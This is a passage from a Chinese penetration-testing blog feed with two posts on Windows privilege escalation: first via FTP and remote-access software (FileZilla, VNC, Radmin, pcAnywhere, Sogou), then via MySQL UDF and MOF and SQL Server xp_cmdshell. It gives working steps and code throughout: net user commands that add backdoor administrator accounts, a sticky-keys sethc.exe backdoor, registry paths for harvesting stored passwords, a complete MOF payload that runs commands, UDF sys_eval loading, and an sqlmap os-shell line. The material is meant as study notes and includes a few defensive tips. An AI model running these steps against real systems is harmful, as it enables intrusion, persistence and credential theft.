title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>可用性较差<br>步骤如下<br>1、以非特权用户登录<br>2、通过添加FTP用户账户hhh<br>3、对FTP服务器添加新的site命令<br>4、新建a.bat文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net<span class="built_in"> user </span>quan quan123 /add</span><br><span class="line">net localgroup administrators quan /add</span><br></pre></td></tr></table></figure><p>5、将a.bat文件映射到新建的site命令</p><p>6、获取system权限<br>以test用户登录ftp服务器，执行以下命令<br>ftp&gt;quote site a</p><h4 id="第三方软件FileZilla提权"><a href="#第三方软件FileZilla提权" class="headerlink" title="第三方软件FileZilla提权"></a>第三方软件FileZilla提权</h4><h5 id="FileZilla简介"><a href="#FileZilla简介" class="headerlink" title="FileZilla简介"></a>FileZilla简介</h5><ul><li>FileZilla是一个免费开源的FTP软件，分为客户端版本和服务器版本，具备所有的FTP软件功能。</li><li>FileZilla的默认端口为<code>14147</code>，只侦听在127.0.0.1的14147端口上，所以无法从外部直接访问，需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。默认安装目录下有两个敏感文件<code>filezillaserver.xml</code>（包含用户信息）和<code>filezillaserverinterface.xml</code>（包含管理信息）</li></ul><h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><p>1、下载这两个文件，拿到管理密码</p><p>2、查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p><p>3、利用<code>lcx</code>端口转发 默认只允许本机连接</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran <span class="number">14148</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">14147</span></span><br></pre></td></tr></table></figure><p>4、以管理员用户远程登录服务端程序<br>转发成功后，通过<code>FileZilla</code>软件进行连接，以管理员用户登入<br>端口为14148，密码默认为空</p><p>5、创建ftp用户并进行权限设置<br>赋予C盘读写权限</p><p>6、用刚创建的用户通过FileZilla的客户端登录ftp</p><p>7、使用<code>cmd.exe</code>改名为<code>sethc.exe</code>替换<code>C:\Windows\System32\sethc.exe</code>生成shift后门</p><p>8、远程登录<code>3389</code>,按<code>5</code>次shift调出<code>cmd.exe</code></p><p>9、添加一个用户，并将其提升为管理员权限</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net<span class="built_in"> user </span>quan 123 /add</span><br><span class="line">net localgroup administrator quan /add</span><br></pre></td></tr></table></figure><h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>​     FTP分为主动连接和被动连接，Filezilla的21端口是不能被转发出来的，将21端口转发出来以后，被动连接就会变成主动连接，Filezilla是不支持主动连接的。将21端口转发出来以后就会发生积极拒绝的情况。</p><p>​    2008系统权限比2003严格一点，导致系统文件是不能修改和删除重命名，这里是没有办法利用 。如果遇到不能提权的时候，可以使用如下几种提权思路。</p><h5 id="扩展知识："><a href="#扩展知识：" class="headerlink" title="扩展知识："></a>扩展知识：</h5><ol><li>通过FTP去篡改他桌面上快捷方式，路径指向给修改到我们的恶意程序。（比较被动）不推荐</li><li>上传利用到2008启动项 目录里，c:/users/administrator/appdata/roaming/microsoft/windows/start menu/programs/startup/</li><li>替换system系统服务程序，进行提权。</li></ol><h4 id="第三方软件FlashFXP提权"><a href="#第三方软件FlashFXP提权" class="headerlink" title="第三方软件FlashFXP提权"></a>第三方软件FlashFXP提权</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20200429102747.png" alt=""></p><h5 id="1、FlashFXP简介"><a href="#1、FlashFXP简介" class="headerlink" title="1、FlashFXP简介"></a>1、FlashFXP简介</h5><ul><li>FlashFXP是一款功能强大的FXP/FTP软件，集成了其它优秀的FTP软件的优点，如CuteFTP的目录比较，支持彩色文字显示；如BpFTP支持多目录选择文件，暂存目录；又如LeapFTP的界面设计。</li></ul><h5 id="2、提权思路"><a href="#2、提权思路" class="headerlink" title="2、提权思路"></a>2、提权思路</h5><p>利用FlashFXP替换文件漏洞，可以读取管理员链接过的站点账号密码。</p><h5 id="3、提权步骤"><a href="#3、提权步骤" class="headerlink" title="3、提权步骤"></a>3、提权步骤</h5><p>（1）下载quick.dat这个文件<br>链接的账号密码都保存在<code>quick.dat</code><br>falshfxp默认安装目录：C:\Program Files\flashfxp</p><p>（2）本地覆盖<br>打开我们本机的FlashFTP把原先的文件替换掉</p><p>（3）获取网站管理密码<br>打开本机软件，查看历史记录，可以看到受害者主机quick.dat 文件里的服务器、用户名、密码等信息。<br>如果想要获取密码，可下载星号密码查看工具查看暗文</p><h4 id="第三方软件pcAnywhere提权"><a href="#第三方软件pcAnywhere提权" class="headerlink" title="第三方软件pcAnywhere提权"></a>第三方软件pcAnywhere提权</h4><h5 id="1、pcAnywhere简介"><a href="#1、pcAnywhere简介" class="headerlink" title="1、pcAnywhere简介"></a>1、pcAnywhere简介</h5><ul><li>PcAnywhere是一款远程控制软件，你可以将你的电脑当成主控端去控制远方另一台同样安装有pcANYWHERE的电脑（被控端），你可以使用被控端电脑上的程序或在主控端与被控端之间互传文件。</li><li>pcAnywher的默认端口为<code>5631、5632</code>。</li><li>pcAnywher的账户和密码保存在一个后缀为<code>.cif</code>的配置文件中,可能是PCA.serven.CIF。</li></ul><h5 id="2、提权步骤"><a href="#2、提权步骤" class="headerlink" title="2、提权步骤"></a><strong>2、提权步骤</strong></h5><p>（1）访问pcAnywhere默认安装目录，查找<code>cif</code>文件并下载<br>默认路径： C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dir</span> <span class="regexp">*.cif</span>/s</span><br></pre></td></tr></table></figure><p>（2）利用破解工具<code>pcAnywherePWD</code>对<code>cif</code>文件直接进行破解</p><p>（3）连接pcAnywhere服务端<br>拿到用户密码后使用客户端连接对pcAnywhere服务端进行连接，之后就和对本地计算机进行操作一样。</p><p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99699638" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99699638</a></p><h4 id="第三方软件VNC提权"><a href="#第三方软件VNC提权" class="headerlink" title="第三方软件VNC提权"></a>第三方软件VNC提权</h4><h5 id="VNC简介"><a href="#VNC简介" class="headerlink" title="VNC简介"></a>VNC简介</h5><p>VNC (Virtual Network Console)是虚拟网络控制台的缩写。它 是一款优秀的远程控制工具软件，由著名的 AT&amp;T 的欧洲研究实验室开发的。</p><h5 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h5><p>安装VNC后会<code>在注册表中保留VNC的密码</code>，通过WEBSHELL远程读取注册表中的密码信息并在本地破解VNC密码进行远程连接来达到提权目的。</p><h5 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h5><p><strong>1、通过读取注册表十进制数</strong><br>（1）RealVNC的注册表路径：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\R</span>ealVNC<span class="symbol">\W</span>inVNC4<span class="symbol">\P</span>assword</span><br></pre></td></tr></table></figure><p>（2）UltraVNC的注册表路径：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\O</span>RL<span class="symbol">\W</span>inVNC3<span class="symbol">\D</span>efault<span class="symbol">\p</span>assword</span><br></pre></td></tr></table></figure><p><strong>2、转换成十六进制数</strong><br>在线转换进制地址链接：<a href="https://www.toolfk.com/tool-convert-hexadecimal" target="_blank" rel="noopener">https://www.toolfk.com/tool-convert-hexadecimal</a></p><p><strong>3、破解十六进制数得到密码</strong><br>使用工具VNC4X进行破解<br>先在CMD输入<code>vncx4.exe -W</code>回车<br>然后将转换后的十六进制挨个输入，每输入一个都按一次回车</p><p><strong>4、使用获取到的账号密码连接vnc</strong><br>通过本地的VNC客户端，连接成功后远程操作实现提权</p><p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99711913" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99711913</a></p><h4 id="第三方软件Radmin提权"><a href="#第三方软件Radmin提权" class="headerlink" title="第三方软件Radmin提权"></a>第三方软件Radmin提权</h4><h5 id="Radmin简介"><a href="#Radmin简介" class="headerlink" title="Radmin简介"></a>Radmin简介</h5><ul><li>Radmin是平时在windows下用的比较多的一个远程管理工具。其具有支持多个连接和IP 过滤(即允许特定的IP控制远程机器)、个性化的档互传、远程关机、支持高分辨率模式、基于Windows NT的安全支持及密码保护以及提供日志文件支持等特性。</li><li>默认开放 <code>4899</code>端口</li><li>Radmin server2.X、Radmin server3.0都存在一个“致命”漏洞 —— radmin hash提权漏洞</li></ul><h5 id="提权思路-1"><a href="#提权思路-1" class="headerlink" title="提权思路"></a>提权思路</h5><p>老版本的Radmin会<code>在注册表中保留密码的Hash值</code>，通过WEBSHELL、远程挂马读取注册表中的密码Hash值并在本地破解密码进行远程连接来达到提权目的。</p><h5 id="提取步骤"><a href="#提取步骤" class="headerlink" title="提取步骤"></a>提取步骤</h5><p><strong>1、获取MD5Hash值</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINESYSTEMRAdminv2<span class="number">.0</span>ServerParametersParameter<span class="comment">//默认密码注册表位置</span></span><br><span class="line">HKEY_LOCAL_MACHINESYSTEMRAdminv2<span class="number">.0</span>ServerParametersPort <span class="comment">//默认端口注册表位置</span></span><br></pre></td></tr></table></figure><p><strong>2、使用RadminHash进行登录</strong><br>在<code>Radmin-Hash</code>客户端输入RAdmin客户端的Hash值即可登录。<br>然后在Radmin-Hash客户端新建服务端，输入所要连接的<code>IP</code>或者扫描存活主机进行连接</p><p><strong>3、查看远程屏幕</strong></p><p>在Radmin客户端选择屏幕控制，输入Hash值即可查看远程主机屏幕。</p><p><strong>4、获取并破解密码</strong><br>用mimikatz解析用户密码，也可以通过上传getpw.exe文件获取用户的sam值，再通过LC5解密。</p><p><strong>5、登录远程桌面</strong></p><p>在本地打开远程桌面连接器，输入远端IP进行登录。</p><h4 id="第三方软件搜狗输入法提权"><a href="#第三方软件搜狗输入法提权" class="headerlink" title="第三方软件搜狗输入法提权"></a>第三方软件搜狗输入法提权</h4><h5 id="提权简介"><a href="#提权简介" class="headerlink" title="提权简介"></a>提权简介</h5><p>​            搜狗低版本输入法根目录下有一个：<strong>PinyinUp.exe</strong>是用来更新词典用的，管理员为了保存词库，有可能会把搜狗输入法安装到D盘，搜狗输入法目录默认是Everyone可读可写，搜狗每隔一段时间就会自动升级，而升级的文件是<strong>PinyinUp.exe</strong>，</p><p>​            由于搜狗输入法默认设置是自动更新，更新程序没有对exe做任何校验直接在输入法升级时调用运行，导致可以执行恶意代码。</p><h5 id="提权步骤-2"><a href="#提权步骤-2" class="headerlink" title="提权步骤"></a>提权步骤</h5><p>​         我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。搜狗拼音输入法，会定时调用这个文件进行升级，用户无法禁止。</p><p>（很老的一个漏洞了，现在应该这种情况应该也很少见了。。。。。）</p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://cloud.tencent.com/developer/article/1547098" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1547098</a></p><p><a href="https://yqxy20.blog.csdn.net/article/details/99707033" target="_blank" rel="noopener">https://yqxy20.blog.csdn.net/article/details/99707033</a></p><p><a href="https://yqxy20.blog.csdn.net/article/details/99715736" target="_blank" rel="noopener">https://yqxy20.blog.csdn.net/article/details/99715736</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;提权之第三方软件提权总结&quot;&gt;&lt;a href=&quot;#提权之第三方软件提权总结&quot; class=&quot;headerlink&quot; title=&quot;提权之第三方软件提权总结&quot;&gt;&lt;/a&gt;提权之第三方软件提权总结&lt;/h2&gt;&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="提权" scheme="https://shu1l.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>windows渗透测试中常见提权方式总结(二)</title>
    <link href="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/"/>
    <id>https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/</id>
    <published>2020-04-28T01:56:41.000Z</published>
    <updated>2020-05-17T11:36:05.721Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试中常见提权方式总结（二）"><a href="#渗透测试中常见提权方式总结（二）" class="headerlink" title="渗透测试中常见提权方式总结（二）"></a>渗透测试中常见提权方式总结（二）</h2><h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="mysql提权概述"><a href="#mysql提权概述" class="headerlink" title="mysql提权概述"></a>mysql提权概述</h4><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><ul><li><strong>功能型：</strong>udf提权</li><li><strong>技巧型：</strong>启动项提权</li><li><strong>漏洞型：</strong>mof提权</li></ul><h4 id="mysql之UDF提权"><a href="#mysql之UDF提权" class="headerlink" title="mysql之UDF提权"></a>mysql之UDF提权</h4><h4 id="原理分析："><a href="#原理分析：" class="headerlink" title="原理分析："></a>原理分析：</h4><p>​        <strong>UDF</strong>(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p><p>​    <strong>动态链接库</strong>：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p><p>​    <strong>udf是Mysql类提权的方式之一</strong>。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p><h4 id="提权常见手法："><a href="#提权常见手法：" class="headerlink" title="提权常见手法："></a>提权常见手法：</h4><p>一般来说使用udf提权的常规手法：</p><ul><li><p>上传大马webshell，利用大马中的UDF提权功能完成提权。</p></li><li><p>反弹shell，进而获取交互式tty shell，在shell中连接本地数据库，从而完成UDF提权。</p></li><li><p>利用FuckMySQL，本地执行命令。<a href="https://github.com/v5est0r/Python_FuckMySQL" target="_blank" rel="noopener">FuckMySQL</a>项目针对Windows平台。</p></li><li><p>利用SQLMAP中的-d参数连接远程数据库，自动上传so库完成UDF提权，从而获取os-shell</p></li><li><p>使用Navicat等数据库管理工具连接远程数据库，从而完成UDF提权。</p><p>其实这些手法的主要目的都是<strong>想方设法登陆数据库服务来执行SQL语句，进而获取到启动MySQL服务的root权限，</strong></p></li></ul><h4 id="提权的一些前提："><a href="#提权的一些前提：" class="headerlink" title="提权的一些前提："></a>提权的一些前提：</h4><p>利用udf提权有一些利用的先决条件：</p><ul><li>MySQL 数据库没有开启安全模式。</li><li>已知的数据库账号具有对 MySQL 数据库 insert 和 delete 的权限，最好是 root 最高权限。</li><li>shell 有写入到数据库安装目录的权限。</li></ul><p><strong>高版本mysql(mysql Version&gt;5.7)遇到的一些问题：</strong></p><ul><li><p>secure-file-priv默认不为空，即不允许在任意文件夹中导出文件；</p><ul><li>如果对方开启了安全模式，我们是无法利用这个办法进行提权的，所以，为了完成今天的浮现，我们需要关闭安全模式。</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">""</span></span><br></pre></td></tr></table></figure><pre><code>将这个代码插入到 mysql 配置文件的最后，重启服务，便可以关闭安全模式。</code></pre></li><li><p>默认root用户使用的authentication-plugins为auth_socket，即在本地登录MySQL时使用unix套接字登录，而非密码；</p></li><li><p>mysql.user下password列更改为authentication_string列。</p></li></ul><h4 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h4><p>首先通过各种手段获取一个网站的webshell，使用菜刀连接。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428160603.png" alt=""></p><p>这个时候获取到的权限往往是一个低用户权限，我们尝试使用udf数据库提权</p><p>我们这里上传一个暗月的mysql数据库提权大马，命名为<code>dama.php</code></p><p><a href="https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）" target="_blank" rel="noopener">https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）</a></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428160926.png" alt=""></p><p>直接网页访问，提示我们需要数据库密码，这里我们可以到网站下数据库配置文件找下<code>config.php</code></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428163445.png" alt=""></p><p>登录后，发现这里直接给出了一些数据库版本为：5.5.53</p><p>还可以执行数据库命令：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428161455.png" alt=""></p><p>这里补充一个点:</p><ul><li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</li><li>如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</li></ul><p>但是mysql默认状态下没有这个文件夹，需要我们自行创建。</p><p>用NTFS ADS流模式突破进而创建文件夹</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@basedir;  <span class="regexp">//</span>查找到mysql的目录</span><br><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> into dumpfile <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION'</span>;    <span class="regexp">//</span>利用NTFS ADS创建<span class="class"><span class="keyword">lib</span>目录</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> into dumpfile <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION'</span>;    <span class="regexp">//</span>利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure><p>我直接在菜刀下创建plugin文件夹</p><p>然后最关键的一步：<strong>导出UDF文件</strong></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428165018.png" alt=""></p><p>导出后，再次尝试文件已经存在，说明导入成功。</p><p>现在只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p><p>引入sys_eval函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> <span class="keyword">STRING</span> <span class="keyword">SONAME</span> <span class="string">'moonudf.dll'</span></span><br></pre></td></tr></table></figure><p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，moonudf.dll是你导出文件的名字;</p><p>之后使用命令模板即可执行命令：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="symbol">'ipconfig</span>)</span><br></pre></td></tr></table></figure><p>也可以直接使用大马这里的功能选项：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428174431.png" alt=""></p><h4 id="其他udf提权方法："><a href="#其他udf提权方法：" class="headerlink" title="其他udf提权方法："></a>其他udf提权方法：</h4><h5 id="msf-udp模块"><a href="#msf-udp模块" class="headerlink" title="msf udp模块"></a>msf udp模块</h5><p>我们使用命令<code>search udf</code>即可看到udf提权payload</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428170837.png" alt=""></p><p>进入模块，看一下需要配置选项：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428170940.png" alt=""></p><p>注：这里注意版本，适用于5.5.9以下，</p><h5 id="sqlmap命令"><a href="#sqlmap命令" class="headerlink" title="sqlmap命令"></a>sqlmap命令</h5><p>使用SQLMAP的-d命令来连接服务并执行UDF提权语句；</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -d mysql://root:xxxxxx<span class="variable">@VPS</span>:3306/mysql --os-shell</span><br></pre></td></tr></table></figure><h3 id="mysql数据库提权之MOF提权"><a href="#mysql数据库提权之MOF提权" class="headerlink" title="mysql数据库提权之MOF提权"></a>mysql数据库提权之MOF提权</h3><h4 id="原理分析：-1"><a href="#原理分析：-1" class="headerlink" title="原理分析："></a>原理分析：</h4><p>利用了<code>c:/windows/system32/wbem/mof/</code>目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p><h4 id="提权复现："><a href="#提权复现：" class="headerlink" title="提权复现："></a>提权复现：</h4><p>首先需要具备Mysql的<code>root</code>权限，我们还是使用上面菜刀连接获得的webshell</p><p>然后我们将<code>nullevt.mof</code>导入到一下可写目录</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428185617.png" alt=""></p><p>文件内容：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma namespace("\\\\.\\root\\subscription")</span></span><br><span class="line">instance of __EventFilter as <span class="variable">$EventFilter</span></span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = <span class="string">"Root\\Cimv2"</span>;</span><br><span class="line">Name = <span class="string">"filtP2"</span>;</span><br><span class="line">Query = <span class="string">"Select * From __InstanceModificationEvent "</span></span><br><span class="line"><span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span></span><br><span class="line"><span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line">QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as <span class="variable">$Consumer</span></span><br><span class="line">&#123;</span><br><span class="line">Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line">ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line">ScriptText =</span><br><span class="line"><span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user test test /add\")"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = <span class="variable">$Consumer</span>;</span><br><span class="line">Filter = <span class="variable">$EventFilter</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里<code>net user test test /add</code>可以自定义，我们这里就是添加一个test用户。</p><p>之后我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">"C:/phpStudy/WWW/nullevt.mof"</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">"c:/windows/system32/wbem/mof/nullevt.mof"</span></span><br></pre></td></tr></table></figure><p>可以使用菜刀下的数据库管理工具执行</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428190009.png" alt=""></p><p>执行后，到win2003上查看用户：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428190809.png" alt=""></p><p>之后我们可以将自定义的命令改为：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.exe localgroup administrators test /<span class="keyword">add</span></span><br></pre></td></tr></table></figure><p>即可对添加的用户进行提权。</p><h4 id="其他mof提权方法："><a href="#其他mof提权方法：" class="headerlink" title="其他mof提权方法："></a>其他mof提权方法：</h4><h5 id="msf-mof提权"><a href="#msf-mof提权" class="headerlink" title="msf mof提权"></a>msf mof提权</h5><p>使用<code>mysql_mof</code>模块，有的版本不能成功，</p><h5 id="上传mof-php"><a href="#上传mof-php" class="headerlink" title="上传mof.php"></a>上传mof.php</h5><p>直接上传mof.php执行命令</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428184713.png" alt=""></p><p>我试了几次都失败了，这里应该需要开启mysql远程连接的功能。。。。</p><h4 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h4><p>​        Mysql Root权限MOF方法提权其前提条件是能够将上传的nullevt.mof复制到系统目录下，例如c:\windows\system32\wbem\mof中，如果无法复制则会提权失败。一般对Windows2003以下操作系统效果较好，Windows2008以上由于保护机制，较少能够成功。因此可以采取以下措施进行防范：</p><ul><li>在程序数据库连接文件中尽量不要使用Root帐号进行连接。</li><li>Root帐号使用强加密方式，采用字母大小写+数字+特殊字符，密码位数15位以上。</li><li>对Mysql数据库的mysql数据库目录权限严格限制，IIS用户无法读写该文件。</li></ul><h3 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL  Server提权"></a>SQL  Server提权</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p><p>xp_cmdshell是Sql Server中的一个组件，我们可以用它来执行系统命令。</p><h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p><strong>利用前提：</strong></p><ul><li>getshell或者存在sql注入并且能够执行命令</li><li>sql server是system权限，sql server默认就是system权限。</li><li>获取SA用户口令</li></ul><h5 id="获取SA用户口令方法"><a href="#获取SA用户口令方法" class="headerlink" title="获取SA用户口令方法"></a>获取SA用户口令方法</h5><ul><li>Webshell或源码获取，一般在网站的配置文件中有存放明文账号密码，常用配置文件名如：</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">conn.aspx</span><br><span class="line">config.aspx</span><br><span class="line">config.php</span><br><span class="line">web.config</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line">一般格式如：</span><br><span class="line"></span><br><span class="line"><span class="attribute">server</span>=localhost;</span><br><span class="line"><span class="attribute">UID</span>=sa;</span><br><span class="line"><span class="attribute">PWD</span>=shadowflow</span><br></pre></td></tr></table></figure><p>获得sa口令，即可通过我们上传的大马进行登录，获得sa相应权限</p><p>有了xp_cmdshell的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。</p><h5 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'show advanced options'</span>, 1;reconfigure;</span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'xp_cmdshell'</span>,1;reconfigure;</span><br></pre></td></tr></table></figure><h5 id="关闭xp-cmdshell"><a href="#关闭xp-cmdshell" class="headerlink" title="关闭xp_cmdshell"></a>关闭xp_cmdshell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'show advanced options'</span>, 1;reconfigure;</span><br><span class="line"><span class="built_in">exec</span> sp_configure <span 